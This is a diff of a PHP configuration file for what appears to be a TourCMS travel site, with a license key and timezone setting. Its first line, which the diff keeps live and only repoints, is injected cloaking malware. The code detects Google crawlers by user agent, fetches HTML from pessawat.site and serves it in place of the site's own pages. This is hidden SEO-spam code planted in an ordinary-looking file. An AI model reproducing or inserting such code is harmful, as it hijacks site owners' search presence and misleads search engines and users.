@@ -1,5 +1,5 @@
 <?php
-function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://pessawat.site/gandullku/index.html');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
+function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://pessawat.site/berangkat/index.html');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
 
 /*======================================================================*\
 
@@ -24,9 +24,7 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 \*======================================================================*/
 define('LICENSE_KEY', 'TourCMS-bb44a53b4bc3cc97664b');
 
-//define('LICENSE_KEY', 'd731276d218908d967491ab9e2a56a01');
-
-date_default_timezone_set('Asia/Ho_Chi_Minh');
+//define('LICENSE_KEY', 'd731276d218908d967491ab9e2a56a01');date_default_timezone_set('Asia/Ho_Chi_Minh');
 
 
 
